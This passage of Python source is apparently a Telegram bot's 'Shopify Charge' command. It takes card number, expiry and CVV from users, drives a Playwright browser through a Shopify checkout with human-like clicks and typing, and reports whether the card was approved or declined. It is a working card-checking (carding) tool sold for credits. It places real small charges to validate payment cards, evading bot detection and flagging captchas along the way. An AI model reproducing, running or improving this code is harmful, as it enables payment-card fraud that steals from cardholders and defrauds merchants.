                    'button:has-text("Complete order")',
                    'input[value="Pay now"]',
                    '[data-testid="pay-button"]',
                    'button[id="checkout-pay-button"]'
                ]

                pay_clicked = False
                for selector in pay_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=5000):
                            await self.human_click(selector)
                            pay_clicked = True
                            break
                    except:
                        continue

                if not pay_clicked:
                    return False, "Could not find Pay now button"

                # Step 12: Wait for result
                self.logger.step(15, "WAIT RESULT", "Waiting for payment processing", "Monitoring page changes", "WAIT")

                # Wait for navigation or status change
                await asyncio.sleep(3)

                # Check for various outcomes
                max_wait = 30
                start_wait = time.time()

                while time.time() - start_wait < max_wait:
                    current_url = self.page.url
                    page_content = await self.page.content()
                    page_text = await self.page.text_content('body')

                    # Check for success indicators
                    if any(indicator in page_text.lower() for indicator in [
                        'thank you', 'order confirmed', 'your order is confirmed',
                        'order #', 'order placed', 'confirmation', 'receipt'
                    ]):
                        # Extract order number if available
                        order_match = re.search(r'Order\s*#?\s*(\d+)', page_text, re.IGNORECASE)
                        order_num = order_match.group(1) if order_match else "Unknown"
                        return True, f"ORDER_PLACED - Order confirmed (Order #{order_num})"

                    # Check for captcha
                    if await self.check_for_captcha():
                        return False, "CAPTCHA_REQUIRED - Solve the captcha"

                    # Check for error messages
                    error_msg = await self.extract_error_message()
                    if error_msg:
                        return False, f"PAYMENT_ERROR - {error_msg}"

                    # Check for decline indicators
                    if any(decline in page_text.lower() for decline in [
                        'card was declined', 'payment failed', 'declined',
                        'there was an issue', 'could not process'
                    ]):
                        # Try to get specific error
                        error_msg = await self.extract_error_message()
                        if error_msg:
                            return False, f"DECLINED - {error_msg}"
                        return False, "DECLINED - Card was declined"

                    # Check if still processing
                    if any(processing in page_text.lower() for processing in [
                        'processing', 'please wait', 'loading'
                    ]):
                        await asyncio.sleep(2)
                        continue

                    await asyncio.sleep(1)

                # Timeout - check final state
                final_url = self.page.url
                if "thank_you" in final_url or "confirmation" in final_url:
                    return True, "ORDER_PLACED - Reached confirmation page"

                # Get final error if any
                final_error = await self.extract_error_message()
                if final_error:
                    return False, f"CHECKOUT_FAILED - {final_error}"

                return False, "CHECKOUT_TIMEOUT - Payment status unclear"

            except Exception as e:
                self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
                return False, f"CHECKOUT_ERROR: {str(e)[:100]}"

            finally:
                # Cleanup
                if self.context:
                    await self.context.close()
                if self.browser:
                    await self.browser.close()

    async def fill_field_if_present(self, selector, value):
        """Helper to fill a field if it exists"""
        try:
            element = self.page.locator(selector).first
            if await element.is_visible(timeout=2000):
                await self.human_type(selector, value)
                return True
        except:
            pass
        return False


# ========== MAIN CHECKER CLASS ==========
class ShopifyChargeCheckerHTTP:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)

    async def check_card(self, card_details, username, user_data):
        """Main card checking method using Playwright human checkout"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            self.logger.card_details_log(cc, mes, ano, cvv)

            # Use Playwright human checkout
            checker = ShopifyHumanCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            self.logger.complete_result(False, "UNKNOWN_ERROR", str(e), elapsed_time)
            try:
                cc = cc_parts[0]
                mes = cc_parts[1]
                ano = cc_parts[2]
                cvv = cc_parts[3]
            except:
                cc = mes = ano = cvv = ""
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Uses Playwright for human-like checkout</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Starting human-like checkout with Playwright...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
<b>[+] Method:</b> Playwright Human Simulation
━━━━━━━━━━━━━━━
<b>Executing human checkout... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeCheckerHTTP(user_id)

        # Process command
        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_details,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="sh",
                    gateway_name="Shopify Charge"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
